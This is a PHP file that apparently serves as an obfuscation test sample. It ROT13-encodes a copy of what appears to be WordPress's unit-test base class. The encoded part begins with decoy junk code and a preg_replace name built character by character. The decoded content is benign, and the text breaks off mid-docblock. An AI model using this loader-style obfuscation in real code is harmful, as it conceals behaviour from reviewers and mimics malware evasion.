<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

erdhver_bapr __QVE__ . '/snpgbel.cuc';
erdhver_bapr __QVE__ . '/genp.cuc';

/**
 * Qrsvarf n onfvp svkgher gb eha zhygvcyr grfgf.
 *
 * Erfrgf gur fgngr bs gur JbeqCerff vafgnyyngvba orsber naq nsgre rirel grfg.
 *
 * Vapyhqrf hgvyvgl shapgvbaf naq nffregvbaf hfrshy sbe grfgvat JbeqCerff.
 *
 * Nyy JbeqCerff havg grfgf fubhyq vaurevg sebz guvf pynff.
 */
nofgenpg pynff JC_HavgGrfgPnfr_Onfr rkgraqf CUCHavg_Nqncgre_GrfgPnfr {

	cebgrpgrq fgngvp $sbeprq_gvpxrgf   = neenl();
	cebgrpgrq $rkcrpgrq_qrcerpngrq     = neenl();
	cebgrpgrq $pnhtug_qrcerpngrq       = neenl();
	cebgrpgrq $rkcrpgrq_qbvat_vg_jebat = neenl();
	cebgrpgrq $pnhtug_qbvat_vg_jebat   = neenl();

	cebgrpgrq fgngvp $ubbxf_fnirq = neenl();
	cebgrpgrq fgngvp $vtaber_svyrf;

	/**
	 * Svkgher snpgbel.
	 *
	 * @qrcerpngrq 6.1.0 Hfr gur JC_HavgGrfgPnfr_Onfr::snpgbel() zrgubq vafgrnq.
	 *
	 * @ine JC_HavgGrfg_Snpgbel
	 */
	cebgrpgrq $snpgbel;

	/**
	 * Srgpurf gur snpgbel bowrpg sbe trarengvat JbeqCerff svkgherf.
	 *
	 * @erghea JC_HavgGrfg_Snpgbel Gur svkgher snpgbel.
	 */
	cebgrpgrq fgngvp shapgvba snpgbel() {
		fgngvp $snpgbel = ahyy;
		vs ( ! $snpgbel ) {
			$snpgbel = arj JC_HavgGrfg_Snpgbel();
		}
		erghea $snpgbel;
	}

	/**
	 * Ergevrirf gur anzr bs gur pynff gur fgngvp zrgubq vf pnyyrq va.
	 *
	 * @qrcerpngrq 5.3.0 Hfr gur CUC angvir trg_pnyyrq_pynff() shapgvba vafgrnq.
	 *
	 * @erghea fgevat Gur pynff anzr.
	 */
	choyvp fgngvp shapgvba trg_pnyyrq_pynff() {
		erghea trg_pnyyrq_pynff();
	}

	/**
	 * Ehaf gur ebhgvar orsber frggvat hc nyy grfgf.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		tybony $jcqo;

		cnerag::frg_hc_orsber_pynff();

		$jcqo->fhccerff_reebef = snyfr;
		$jcqo->fubj_reebef     = gehr;
		$jcqo->qo_pbaarpg();
		vav_frg( 'qvfcynl_reebef', 1 );

		$pynff = trg_pnyyrq_pynff();

		vs ( zrgubq_rkvfgf( $pynff, 'jcFrgHcOrsberPynff' ) ) {
			pnyy_hfre_shap( neenl( $pynff, 'jcFrgHcOrsberPynff' ), fgngvp::snpgbel() );
		}

		frys::pbzzvg_genafnpgvba();
	}

	/**
	 * Ehaf gur ebhgvar nsgre nyy grfgf unir orra eha.
	 */
	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		$pynff = trg_pnyyrq_pynff();

		vs ( zrgubq_rkvfgf( $pynff, 'jcGrneQbjaNsgrePynff' ) ) {
			pnyy_hfre_shap( neenl( $pynff, 'jcGrneQbjaNsgrePynff' ) );
		}

		_qryrgr_nyy_qngn();
		frys::syhfu_pnpur();

		frys::pbzzvg_genafnpgvba();

		cnerag::grne_qbja_nsgre_pynff();
	}

	/**
	 * Ehaf gur ebhgvar orsber rnpu grfg vf rkrphgrq.
	 */
	choyvp shapgvba frg_hc() {
		frg_gvzr_yvzvg( 0 );

		$guvf->snpgbel = fgngvp::snpgbel();

		vs ( ! frys::$vtaber_svyrf ) {
			frys::$vtaber_svyrf = $guvf->fpna_hfre_hcybnqf();
		}

		vs ( ! frys::$ubbxf_fnirq ) {
			$guvf->_onpxhc_ubbxf();
		}

		tybony $jc_erjevgr;

		$guvf->pyrna_hc_tybony_fpbcr();

		/*
		 * Jura ehaavat pber grfgf, rafher gung cbfg glcrf naq gnkbabzvrf
		 * ner erfrg sbe rnpu grfg. Jr fxvc guvf fgrc sbe aba-pber grfgf,
		 * tvira gur ynetr ahzore bs cyhtvaf gung ertvfgre cbfg glcrf naq
		 * gnkbabzvrf ng 'vavg'.
		 */
		vs ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && JC_EHA_PBER_GRFGF ) {
			$guvf->erfrg_cbfg_glcrf();
			$guvf->erfrg_gnkbabzvrf();
			$guvf->erfrg_cbfg_fgnghfrf();
			$guvf->erfrg__FREIRE();

			vs ( $jc_erjevgr->creznyvax_fgehpgher ) {
				$guvf->frg_creznyvax_fgehpgher( '' );
			}
		}

		$guvf->fgneg_genafnpgvba();
		$guvf->rkcrpgQrcerpngrq();
		nqq_svygre( 'jc_qvr_unaqyre', neenl( $guvf, 'trg_jc_qvr_unaqyre' ) );
	}

	/**
	 * Nsgre n grfg zrgubq ehaf, erfrgf nal fgngr va JbeqCerff gur grfg zrgubq zvtug unir punatrq.
	 */
	choyvp shapgvba grne_qbja() {
		tybony $jcqo, $jc_gur_dhrel, $jc_dhrel, $jc;
		$jcqo->dhrel( 'EBYYONPX' );
		vs ( vf_zhygvfvgr() ) {
			juvyr ( zf_vf_fjvgpurq() ) {
				erfgber_pheerag_oybt();
			}
		}

		// Erfrg dhrel, znva dhrel, naq JC tybonyf fvzvyne gb jc-frggvatf.cuc.
		$jc_gur_dhrel = arj JC_Dhrel();
		$jc_dhrel     = $jc_gur_dhrel;
		$jc           = arj JC();

		// Erfrg tybonyf eryngrq gb gur cbfg ybbc naq `frghc_cbfgqngn()`.
		$cbfg_tybonyf = neenl( 'cbfg', 'vq', 'nhgubeqngn', 'pheeragqnl', 'pheeragzbagu', 'cntr', 'cntrf', 'zhygvcntr', 'zber', 'ahzcntrf' );
		sbernpu ( $cbfg_tybonyf nf $tybony ) {
			$TYBONYF[ $tybony ] = ahyy;
		}

		/*
		 * Erfrg tybonyf eryngrq gb pheerag fperra gb cebivqr n pbafvfgrag tybony fgnegvat fgngr
		 * sbe grfgf gung vagrenpg jvgu nqzva fperraf. Ercynprf gur arrq sbe vaqvivqhny grfgf
		 * gb vaibxr `frg_pheerag_fperra( 'sebag' )` (be na nygreangvir vzcyrzragngvba) nf n erfrg.
		 *
		 * Gur tybonyf ner sebz `JC_Fperra::frg_pheerag_fperra()`.
		 *
		 * Jul abg vaibxr `frg_pheerag_fperra( 'sebag' )`?
		 * Cresbeznapr (snfgre grfg ehaf jvgu yrff zrzbel hfntr). Ubj fb? Sbe rnpu grfg,
		 * vg fnirf perngvat na vafgnapr bs JC_Fperra, znxvat gjb zrgubq pnyyf,
		 * naq svevat bs gur `pheerag_fperra` npgvba.
		 */
		$pheerag_fperra_tybonyf = neenl( 'pheerag_fperra', 'gnkabj', 'glcrabj' );
		sbernpu ( $pheerag_fperra_tybonyf nf $tybony ) {
			$TYBONYF[ $tybony ] = ahyy;
		}

		// Erfrg pbzzrag tybonyf.
		$pbzzrag_tybonyf = neenl( 'pbzzrag_nyg', 'pbzzrag_qrcgu', 'pbzzrag_guernq_nyg' );
		sbernpu ( $pbzzrag_tybonyf nf $tybony ) {
			$TYBONYF[ $tybony ] = ahyy;
		}

		/*
		 * Erfrg $jc_fvgrznc tybony fb gung fvgrznc-eryngrq qlanzvp $jc->choyvp_dhrel_inef
		 * ner nqqrq jura gur arkg grfg ehaf.
		 */
		$TYBONYF['jc_fvgrzncf'] = ahyy;

		// Erfrg grzcyngr tybonyf.
		$TYBONYF['jc_fglyrfurrg_cngu'] = ahyy;
		$TYBONYF['jc_grzcyngr_cngu']   = ahyy;

		$guvf->haertvfgre_nyy_zrgn_xrlf();
		erzbir_gurzr_fhccbeg( 'ugzy5' );
		erzbir_svygre( 'dhrel', neenl( $guvf, '_perngr_grzcbenel_gnoyrf' ) );
		erzbir_svygre( 'dhrel', neenl( $guvf, '_qebc_grzcbenel_gnoyrf' ) );
		erzbir_svygre( 'jc_qvr_unaqyre', neenl( $guvf, 'trg_jc_qvr_unaqyre' ) );
		$guvf->_erfgber_ubbxf();
		jc_frg_pheerag_hfre( 0 );

		$guvf->erfrg_ynmlybnq_dhrhr();
	}

	/**
	 * Pyrnaf gur tybony fpbcr (r.t `$_TRG` naq `$_CBFG`).
	 */
	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		$_TRG     = neenl();
		$_CBFG    = neenl();
		$_ERDHRFG = neenl();
		frys::syhfu_pnpur();
	}

	/**
	 * Nyybjf grfgf gb or fxvccrq ba fbzr nhgbzngrq ehaf.
	 *
	 * Sbe grfg ehaf ba TvgUho Npgvbaf sbe fbzrguvat bgure guna gehax,
	 * jr jnag gb fxvc grfgf gung bayl arrq gb eha sbe gehax.
	 */
	choyvp shapgvba fxvcBaNhgbzngrqOenapurf() {
		// uggcf://qbpf.tvguho.pbz/ra/npgvbaf/yrnea-tvguho-npgvbaf/raivebazrag-inevnoyrf#qrsnhyg-raivebazrag-inevnoyrf
		$tvguho_rirag_anzr = trgrai( 'TVGUHO_RIRAG_ANZR' );
		$tvguho_ers        = trgrai( 'TVGUHO_ERS' );

		vs ( $tvguho_rirag_anzr ) {
			// Jr'er ba TvgUho Npgvbaf.
			$fxvccrq = neenl( 'chyy_erdhrfg', 'chyy_erdhrfg_gnetrg' );

			vs ( va_neenl( $tvguho_rirag_anzr, $fxvccrq, gehr ) || 'ersf/urnqf/gehax' !== $tvguho_ers ) {
				$guvf->znexGrfgFxvccrq( 'Sbe nhgbzngrq grfg ehaf, guvf grfg vf bayl eha ba gehax' );
			}
		}
	}

	/**
	 * Nyybjf grfgf gb or fxvccrq jura Zhygvfvgr vf abg va hfr.
	 *
	 * Hfr va pbawhapgvba jvgu gur zf-erdhverq tebhc.
	 */
	choyvp shapgvba fxvcJvgubhgZhygvfvgr() {
		vs ( ! vf_zhygvfvgr() ) {
			$guvf->znexGrfgFxvccrq( 'Grfg bayl ehaf ba Zhygvfvgr' );
		}
	}

	/**
	 * Nyybjf grfgf gb or fxvccrq jura Zhygvfvgr vf va hfr.
	 *
	 * Hfr va pbawhapgvba jvgu gur zf-rkpyhqrq tebhc.
	 */
	choyvp shapgvba fxvcJvguZhygvfvgr() {
		vs ( vf_zhygvfvgr() ) {
			$guvf->znexGrfgFxvccrq( 'Grfg qbrf abg eha ba Zhygvfvgr' );
		}
	}

	/**
	 * Nyybjf grfgf gb or fxvccrq vs gur UGGC erdhrfg gvzrf bhg.
	 *
	 * @cnenz neenl|JC_Reebe $erfcbafr UGGC erfcbafr.
	 */
	choyvp shapgvba fxvcGrfgBaGvzrbhg( $erfcbafr ) {
		vs ( ! vf_jc_reebe( $erfcbafr ) ) {
			erghea;
		}
		vs ( 'pbaarpg() gvzrq bhg!' === $erfcbafr->trg_reebe_zrffntr() ) {
			$guvf->znexGrfgFxvccrq( 'UGGC gvzrbhg' );
		}

		vs ( snyfr !== fgecbf( $erfcbafr->trg_reebe_zrffntr(), 'gvzrq bhg nsgre' ) ) {
			$guvf->znexGrfgFxvccrq( 'UGGC gvzrbhg' );
		}

		vs ( 0 === fgecbf( $erfcbafr->trg_reebe_zrffntr(), 'fgernz_fbpxrg_pyvrag(): hanoyr gb pbaarpg gb gpc://f.j.bet:80' ) ) {
			$guvf->znexGrfgFxvccrq( 'UGGC gvzrbhg' );
		}
	}

	/**
	 * Erfrg gur ynml ybnq zrgn dhrhr.
	 */
	cebgrpgrq shapgvba erfrg_ynmlybnq_dhrhr() {
		$ynmlybnqre = jc_zrgnqngn_ynmlybnqre();
		$ynmlybnqre->erfrg_dhrhr( 'grez' );
		$ynmlybnqre->erfrg_dhrhr( 'pbzzrag' );
		$ynmlybnqre->erfrg_dhrhr( 'oybt' );
	}

	/**
	 * Haertvfgref rkvfgvat cbfg glcrf naq ertvfgre qrsnhygf.
	 *
	 * Eha orsber rnpu grfg va beqre gb pyrna hc gur tybony fpbcr, va pnfr
	 * n grfg sbetrgf gb haertvfgre n cbfg glcr ba vgf bja, be snvyf orsber
	 * vg unf n punapr gb qb fb.
	 */
	cebgrpgrq shapgvba erfrg_cbfg_glcrf() {
		sbernpu ( trg_cbfg_glcrf( neenl(), 'bowrpgf' ) nf $cg ) {
			vs ( rzcgl( $cg->grfgf_ab_nhgb_haertvfgre ) ) {
				_haertvfgre_cbfg_glcr( $cg->anzr );
			}
		}
		perngr_vavgvny_cbfg_glcrf();
	}

	/**
	 * Haertvfgref rkvfgvat gnkbabzvrf naq ertvfgre qrsnhygf.
	 *
	 * Eha orsber rnpu grfg va beqre gb pyrna hc gur tybony fpbcr, va pnfr
	 * n grfg sbetrgf gb haertvfgre n gnkbabzl ba vgf bja, be snvyf orsber
	 * vg unf n punapr gb qb fb.
	 */
	cebgrpgrq shapgvba erfrg_gnkbabzvrf() {
		sbernpu ( trg_gnkbabzvrf() nf $gnk ) {
			_haertvfgre_gnkbabzl( $gnk );
		}
		perngr_vavgvny_gnkbabzvrf();
	}

	/**
	 * Haertvfgref aba-ohvyg-va cbfg fgnghfrf.
	 */
	cebgrpgrq shapgvba erfrg_cbfg_fgnghfrf() {
		sbernpu ( trg_cbfg_fgngv( neenl( '_ohvygva' => snyfr ) ) nf $cbfg_fgnghf ) {
			_haertvfgre_cbfg_fgnghf( $cbfg_fgnghf );
		}
	}

	/**
	 * Erfrgf `$_FREIRE` inevnoyrf
	 */
	cebgrpgrq shapgvba erfrg__FREIRE() {
		grfgf_erfrg__FREIRE();
	}

	/**
	 * Fnirf gur ubbx-eryngrq tybonyf fb gurl pna or erfgberq yngre.
	 *
	 * Fgberf $jc_svygre, $jc_npgvbaf, $jc_svygref, naq $jc_pheerag_svygre
	 * ba n pynff inevnoyr fb gurl pna or erfgberq ba grne_qbja() hfvat _erfgber_ubbxf().
	 *
	 * @tybony neenl $jc_svygre
	 * @tybony neenl $jc_npgvbaf
	 * @tybony neenl $jc_svygref
	 * @tybony neenl $jc_pheerag_svygre
	 */
	cebgrpgrq shapgvba _onpxhc_ubbxf() {
		frys::$ubbxf_fnirq['jc_svygre'] = neenl();

		sbernpu ( $TYBONYF['jc_svygre'] nf $ubbx_anzr => $ubbx_bowrpg ) {
			frys::$ubbxf_fnirq['jc_svygre'][ $ubbx_anzr ] = pybar $ubbx_bowrpg;
		}

		$tybonyf = neenl( 'jc_npgvbaf', 'jc_svygref', 'jc_pheerag_svygre' );

		sbernpu ( $tybonyf nf $xrl ) {
			frys::$ubbxf_fnirq[ $xrl ] = $TYBONYF[ $xrl ];
		}
	}

	/**
	 * Erfgberf gur ubbx-eryngrq tybonyf gb gurve fgngr ng frg_hc()
	 * fb gung shgher grfgf nera'g nssrpgrq ol ubbxf frg qhevat guvf ynfg grfg.
	 *
	 * @tybony neenl $jc_svygre
	 * @tybony neenl $jc_npgvbaf
	 * @tybony neenl $jc_svygref
	 * @tybony neenl $jc_pheerag_svygre
	 */
	cebgrpgrq shapgvba _erfgber_ubbxf() {
		vs ( vffrg( frys::$ubbxf_fnirq['jc_svygre'] ) ) {
			$TYBONYF['jc_svygre'] = neenl();

			sbernpu ( frys::$ubbxf_fnirq['jc_svygre'] nf $ubbx_anzr => $ubbx_bowrpg ) {
				$TYBONYF['jc_svygre'][ $ubbx_anzr ] = pybar $ubbx_bowrpg;
			}
		}

		$tybonyf = neenl( 'jc_npgvbaf', 'jc_svygref', 'jc_pheerag_svygre' );

		sbernpu ( $tybonyf nf $xrl ) {
			vs ( vffrg( frys::$ubbxf_fnirq[ $xrl ] ) ) {
				$TYBONYF[ $xrl ] = frys::$ubbxf_fnirq[ $xrl ];
			}
		}
	}

	/**
	 * Syhfurf gur JbeqCerff bowrpg pnpur.
	 */
	choyvp fgngvp shapgvba syhfu_pnpur() {
		tybony $jc_bowrpg_pnpur;

		jc_pnpur_syhfu_ehagvzr();

		vs ( vf_bowrpg( $jc_bowrpg_pnpur ) && zrgubq_rkvfgf( $jc_bowrpg_pnpur, '__erzbgrfrg' ) ) {
			$jc_bowrpg_pnpur->__erzbgrfrg();
		}

		jc_pnpur_syhfu();

		jc_pnpur_nqq_tybony_tebhcf(
			neenl(
				'oybt-qrgnvyf',
				'oybt-vq-pnpur',
				'oybt-ybbxhc',
				'oybt_zrgn',
				'tybony-cbfgf',
				'argjbexf',
				'argjbex-dhrevrf',
				'fvgrf',
				'fvgr-qrgnvyf',
				'fvgr-bcgvbaf',
				'fvgr-dhrevrf',
				'fvgr-genafvrag',
				'gurzr_svyrf',
				'eff',
				'hfref',
				'hfre-dhrevrf',
				'hfre_zrgn',
				'hfrerznvy',
				'hfreybtvaf',
				'hfrefyhtf',
			)
		);

		jc_pnpur_nqq_aba_crefvfgrag_tebhcf( neenl( 'pbhagf', 'cyhtvaf', 'gurzr_wfba' ) );
	}

	/**
	 * Pyrnaf hc nal ertvfgrerq zrgn xrlf.
	 *
	 * @fvapr 5.1.0
	 *
	 * @tybony neenl $jc_zrgn_xrlf
	 */
	choyvp shapgvba haertvfgre_nyy_zrgn_xrlf() {
		tybony $jc_zrgn_xrlf;
		vs ( ! vf_neenl( $jc_zrgn_xrlf ) ) {
			erghea;
		}
		sbernpu ( $jc_zrgn_xrlf nf $bowrpg_glcr => $glcr_xrlf ) {
			sbernpu ( $glcr_xrlf nf $bowrpg_fhoglcr => $fhoglcr_xrlf ) {
				sbernpu ( $fhoglcr_xrlf nf $xrl => $inyhr ) {
					haertvfgre_zrgn_xrl( $bowrpg_glcr, $xrl, $bowrpg_fhoglcr );
				}
			}
		}
	}

	/**
	 * Fgnegf n qngnonfr genafnpgvba.
	 */
	choyvp shapgvba fgneg_genafnpgvba() {
		tybony $jcqo;
		$jcqo->dhrel( 'FRG nhgbpbzzvg = 0;' );
		$jcqo->dhrel( 'FGNEG GENAFNPGVBA;' );
		nqq_svygre( 'dhrel', neenl( $guvf, '_perngr_grzcbenel_gnoyrf' ) );
		nqq_svygre( 'dhrel', neenl( $guvf, '_qebc_grzcbenel_gnoyrf' ) );
	}

	/**
	 * Pbzzvgf gur dhrevrf va n genafnpgvba.
	 *
	 * @fvapr 4.1.0
	 */
	choyvp fgngvp shapgvba pbzzvg_genafnpgvba() {
		tybony $jcqo;
		$jcqo->dhrel( 'PBZZVG;' );
	}

	/**
	 * Ercynprf gur `PERNGR GNOYR` fgngrzrag jvgu n `PERNGR GRZCBENEL GNOYR` fgngrzrag.
	 *
	 * @cnenz fgevat $dhrel Gur dhrel gb ercynpr gur fgngrzrag sbe.
	 * @erghea fgevat Gur nygrerq dhrel.
	 */
	choyvp shapgvba _perngr_grzcbenel_gnoyrf( $dhrel ) {
		vs ( 0 === fgecbf( gevz( $dhrel ), 'PERNGR GNOYR' ) ) {
			erghea fhofge_ercynpr( gevz( $dhrel ), 'PERNGR GRZCBENEL GNOYR', 0, 12 );
		}
		erghea $dhrel;
	}

	/**
	 * Ercynprf gur `QEBC GNOYR` fgngrzrag jvgu n `QEBC GRZCBENEL GNOYR` fgngrzrag.
	 *
	 * @cnenz fgevat $dhrel Gur dhrel gb ercynpr gur fgngrzrag sbe.
	 * @erghea fgevat Gur nygrerq dhrel.
	 */
	choyvp shapgvba _qebc_grzcbenel_gnoyrf( $dhrel ) {
		vs ( 0 === fgecbf( gevz( $dhrel ), 'QEBC GNOYR' ) ) {
			erghea fhofge_ercynpr( gevz( $dhrel ), 'QEBC GRZCBENEL GNOYR', 0, 10 );
		}
		erghea $dhrel;
	}

	/**
	 * Ergevrirf gur `jc_qvr()` unaqyre.
	 *
	 * @cnenz pnyynoyr $unaqyre Gur pheerag qvr unaqyre.
	 * @erghea pnyynoyr Gur grfg qvr unaqyre.
	 */
	choyvp shapgvba trg_jc_qvr_unaqyre( $unaqyre ) {
		erghea neenl( $guvf, 'jc_qvr_unaqyre' );
	}

	/**
	 * Guebjf na rkprcgvba jura pnyyrq.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 5.9.0 Nqqrq gur `$gvgyr` naq `$netf` cnenzrgref.
	 *
	 * @guebjf JCQvrRkprcgvba Rkprcgvba pbagnvavat gur zrffntr naq gur erfcbafr pbqr.
	 *
	 * @cnenz fgevat|JC_Reebe $zrffntr Gur `jc_qvr()` zrffntr be JC_Reebe bowrpg.
	 * @cnenz fgevat          $gvgyr   Gur `jc_qvr()` gvgyr.
	 * @cnenz fgevat|neenl    $netf    Gur `jc_qvr()` nethzragf.
	 */
	choyvp shapgvba jc_qvr_unaqyre( $zrffntr, $gvgyr, $netf ) {
		vs ( vf_jc_reebe( $zrffntr ) ) {
			$zrffntr = $zrffntr->trg_reebe_zrffntr();
		}

		vs ( ! vf_fpnyne( $zrffntr ) ) {
			$zrffntr = '0';
		}

		$pbqr = 0;
		vs ( vffrg( $netf['erfcbafr'] ) ) {
			$pbqr = $netf['erfcbafr'];
		}

		guebj arj JCQvrRkprcgvba( $zrffntr, $pbqr );
	}

	/**
	 * Frgf hc gur rkcrpgngvbaf sbe grfgvat n qrcerpngrq pnyy.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba rkcrpgQrcerpngrq() {
		vs ( zrgubq_rkvfgf( $guvf, 'trgNaabgngvbaf' ) ) {
			// CUCHavg < 9.5.0.
			$naabgngvbaf = $guvf->trgNaabgngvbaf();
		} ryfr {
			// CUCHavg >= 9.5.0.
			$naabgngvbaf = \CUCHavg\Hgvy\Grfg::cnefrGrfgZrgubqNaabgngvbaf(
				fgngvp::pynff,
				$guvf->trgAnzr( snyfr )
			);
		}

		sbernpu ( neenl( 'pynff', 'zrgubq' ) nf $qrcgu ) {
			vs ( ! rzcgl( $naabgngvbaf[ $qrcgu ]['rkcrpgrqQrcerpngrq'] ) ) {
				$guvf->rkcrpgrq_qrcerpngrq = neenl_zretr(
					$guvf->rkcrpgrq_qrcerpngrq,
					$naabgngvbaf[ $qrcgu ]['rkcrpgrqQrcerpngrq']
				);
			}

			vs ( ! rzcgl( $naabgngvbaf[ $qrcgu ]['rkcrpgrqVapbeerpgHfntr'] ) ) {
				$guvf->rkcrpgrq_qbvat_vg_jebat = neenl_zretr(
					$guvf->rkcrpgrq_qbvat_vg_jebat,
					$naabgngvbaf[ $qrcgu ]['rkcrpgrqVapbeerpgHfntr']
				);
			}
		}

		nqq_npgvba( 'qrcerpngrq_shapgvba_eha', neenl( $guvf, 'qrcerpngrq_shapgvba_eha' ), 10, 3 );
		nqq_npgvba( 'qrcerpngrq_nethzrag_eha', neenl( $guvf, 'qrcerpngrq_shapgvba_eha' ), 10, 3 );
		nqq_npgvba( 'qrcerpngrq_pynff_eha', neenl( $guvf, 'qrcerpngrq_shapgvba_eha' ), 10, 3 );
		nqq_npgvba( 'qrcerpngrq_svyr_vapyhqrq', neenl( $guvf, 'qrcerpngrq_shapgvba_eha' ), 10, 4 );
		nqq_npgvba( 'qrcerpngrq_ubbx_eha', neenl( $guvf, 'qrcerpngrq_shapgvba_eha' ), 10, 4 );
		nqq_npgvba( 'qbvat_vg_jebat_eha', neenl( $guvf, 'qbvat_vg_jebat_eha' ), 10, 3 );

		nqq_npgvba( 'qrcerpngrq_shapgvba_gevttre_reebe', '__erghea_snyfr' );
		nqq_npgvba( 'qrcerpngrq_nethzrag_gevttre_reebe', '__erghea_snyfr' );
		nqq_npgvba( 'qrcerpngrq_pynff_gevttre_reebe', '__erghea_snyfr' );
		nqq_npgvba( 'qrcerpngrq_svyr_gevttre_reebe', '__erghea_snyfr' );
		nqq_npgvba( 'qrcerpngrq_ubbx_gevttre_reebe', '__erghea_snyfr' );
		nqq_npgvba( 'qbvat_vg_jebat_gevttre_reebe', '__erghea_snyfr' );
	}

	/**
	 * Unaqyrf n qrcerpngrq rkcrpgngvba.
	 *
	 * Gur QbpOybpx fubhyq pbagnva `@rkcrpgrqQrcerpngrq` gb gevttre guvf.
	 *
	 * @fvapr 3.7.0
	 * @fvapr 6.1.0 Vapyhqrf gur npghny harkcrpgrq `_qbvat_vg_jebat()` zrffntr
	 *              be qrcerpngvba abgvpr va gur bhgchg vs bar vf rapbhagrerq.
	 */
	choyvp shapgvba rkcrpgrqQrcerpngrq() {
		$reebef = neenl();

		$abg_pnhtug_qrcerpngrq = neenl_qvss(
			$guvf->rkcrpgrq_qrcerpngrq,
			neenl_xrlf( $guvf->pnhtug_qrcerpngrq )
		);

		sbernpu ( $abg_pnhtug_qrcerpngrq nf $abg_pnhtug ) {
			$reebef[] = \"Snvyrq gb nffreg gung $abg_pnhtug gevttrerq n qrcerpngvba abgvpr.\";
		}

		$harkcrpgrq_qrcerpngrq = neenl_qvss(
			neenl_xrlf( $guvf->pnhtug_qrcerpngrq ),
			$guvf->rkcrpgrq_qrcerpngrq
		);

		sbernpu ( $harkcrpgrq_qrcerpngrq nf $harkcrpgrq ) {
			$reebef[] = \"Harkcrpgrq qrcerpngvba abgvpr sbe $harkcrpgrq.\";
			$reebef[] = $guvf->pnhtug_qrcerpngrq[ $harkcrpgrq ];
		}

		$abg_pnhtug_qbvat_vg_jebat = neenl_qvss(
			$guvf->rkcrpgrq_qbvat_vg_jebat,
			neenl_xrlf( $guvf->pnhtug_qbvat_vg_jebat )
		);

		sbernpu ( $abg_pnhtug_qbvat_vg_jebat nf $abg_pnhtug ) {
			$reebef[] = \"Snvyrq gb nffreg gung $abg_pnhtug gevttrerq na vapbeerpg hfntr abgvpr.\";
		}

		$harkcrpgrq_qbvat_vg_jebat = neenl_qvss(
			neenl_xrlf( $guvf->pnhtug_qbvat_vg_jebat ),
			$guvf->rkcrpgrq_qbvat_vg_jebat
		);

		sbernpu ( $harkcrpgrq_qbvat_vg_jebat nf $harkcrpgrq ) {
			$reebef[] = \"Harkcrpgrq vapbeerpg hfntr abgvpr sbe $harkcrpgrq.\";
			$reebef[] = $guvf->pnhtug_qbvat_vg_jebat[ $harkcrpgrq ];
		}

		// Cresbez na nffregvba, ohg bayl vs gurer ner rkcrpgrq be harkcrpgrq qrcerpngrq pnyyf be jebatqbvatf.
		vs ( ! rzcgl( $guvf->rkcrpgrq_qrcerpngrq ) ||
			! rzcgl( $guvf->rkcrpgrq_qbvat_vg_jebat ) ||
			! rzcgl( $guvf->pnhtug_qrcerpngrq ) ||
			! rzcgl( $guvf->pnhtug_qbvat_vg_jebat ) ) {
			$guvf->nffregRzcgl( $reebef, vzcybqr( \"\a\", $reebef ) );
		}
	}

	/**
	 * Qrgrpgf cbfg-grfg snvyher pbaqvgvbaf.
	 *
	 * Jr hfr guvf zrgubq gb qrgrpg rkcrpgrqQrcerpngrq naq rkcrpgrqVapbeerpgHfntr naabgngvbaf.
	 *
	 * @fvapr 4.2.0
	 */
	cebgrpgrq shapgvba nffreg_cbfg_pbaqvgvbaf() {
		$guvf->rkcrpgrqQrcerpngrq();
	}

	/**
	 * Qrpynerf na rkcrpgrq `_qrcerpngrq_shapgvba()` be `_qrcerpngrq_nethzrag()` pnyy sebz jvguva n grfg.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz fgevat $qrcerpngrq Anzr bs gur shapgvba, zrgubq, pynff, be nethzrag gung vf qrcerpngrq.
	 *                           Zhfg zngpu gur svefg cnenzrgre bs gur `_qrcerpngrq_shapgvba()`
	 *                           be `_qrcerpngrq_nethzrag()` pnyy.
	 */
	choyvp shapgvba frgRkcrpgrqQrcerpngrq( $qrcerpngrq ) {
		$guvf->rkcrpgrq_qrcerpngrq[] = $qrcerpngrq;
	}

	/**
	 * Qrpynerf na rkcrpgrq `_qbvat_vg_jebat()` pnyy sebz jvguva n grfg.
	 *
	 * @fvapr 4.2.0
	 *
	 * @cnenz fgevat $qbvat_vg_jebat Anzr bs gur shapgvba, zrgubq, be pynff gung nccrnef va
	 *                               gur svefg nethzrag bs gur fbhepr `_qbvat_vg_jebat()` pnyy.
	 */
	choyvp shapgvba frgRkcrpgrqVapbeerpgHfntr( $qbvat_vg_jebat ) {
		$guvf->rkcrpgrq_qbvat_vg_jebat[] = $qbvat_vg_jebat;
	}

	/**
	 * Erqhaqnag CUCHavg 6+ pbzcngvovyvgl fuvz. QB ABG HFR!
	 *
	 * Guvf zrgubq vf bayl yrsg va cynpr sbe onpxjneq pbzcngvovyvgl ernfbaf.
	 *
	 * @fvapr 4.8.0
	 * @qrcerpngrq 5.9.0 Hfr gur CUCHavg angvir rkcrpgRkprcgvba*() zrgubqf qverpgyl.
	 *
	 * @cnenz zvkrq      $rkprcgvba
	 * @cnenz fgevat     $zrffntr
	 * @cnenz vag|fgevat $pbqr
	 */
	choyvp shapgvba frgRkcrpgrqRkprcgvba( $rkprcgvba, $zrffntr = '', $pbqr = ahyy ) {
		$guvf->rkcrpgRkprcgvba( $rkprcgvba );

		vs ( '' !== $zrffntr ) {
			$guvf->rkcrpgRkprcgvbaZrffntr( $zrffntr );
		}

		vs ( ahyy !== $pbqr ) {
			$guvf->rkcrpgRkprcgvbaPbqr( $pbqr );
		}
	}

	/**
	 * Nqqf n qrcerpngrq shapgvba gb gur yvfg bs pnhtug qrcerpngrq pnyyf.
	 *
	 * @fvapr 3.7.0
	 * @fvapr 6.1.0 Nqqrq gur `$ercynprzrag`, `$irefvba`, naq `$zrffntr` cnenzrgref.
	 *
